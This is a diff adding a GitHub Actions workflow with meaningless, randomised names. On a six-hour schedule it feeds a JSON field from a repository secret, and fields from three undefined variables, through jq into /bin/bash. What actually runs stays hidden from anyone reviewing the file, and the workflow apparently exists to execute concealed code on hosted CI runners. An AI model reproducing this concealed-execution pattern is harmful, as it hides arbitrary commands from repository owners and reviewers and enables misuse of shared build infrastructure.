@@ -1,0 +1,20 @@
+name: jiyueye4756
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '11 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: jiyueye4756
+        env:
+          g83: ${{ secrets.g83 }}
+        run: |
+          echo $g83 | jq -r .fyrq757 | /bin/bash
+          echo $txxh9517 | jq -r .uivd79507 | /bin/bash
+          echo $kutq8 | jq -r .kow1 | /bin/bash
+          echo $zrgdl89 | jq -r .kz0 | /bin/bash
+
